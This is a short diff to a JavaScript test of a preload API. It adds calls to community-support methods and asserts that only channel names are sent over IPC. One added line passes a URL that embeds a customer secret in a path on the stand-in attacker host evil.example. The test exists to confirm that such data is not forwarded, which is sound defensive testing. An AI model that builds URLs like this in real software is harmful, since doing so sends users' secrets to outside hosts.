@@ -177,6 +177,15 @@ async function main() {
     "docflow:activation-clear"
   ]);
 
+  await api.getCommunitySupportState({ customer: CUSTOMER_SECRET });
+  await api.dismissCommunitySupportPrompt({ customer: CUSTOMER_SECRET });
+  await api.openCommunitySupport({ url: `https://evil.example/${CUSTOMER_SECRET}` });
+  assert.deepEqual(calls.slice(9), [
+    ["docflow:community-support-state"],
+    ["docflow:community-support-dismiss"],
+    ["docflow:community-support-open"]
+  ]);
+
   assert.equal(Object.prototype.hasOwnProperty.call(api, "readFile"), false);
   assert.equal(Object.prototype.hasOwnProperty.call(api, "writeFile"), false);
   console.log("preload P3 API tests passed");
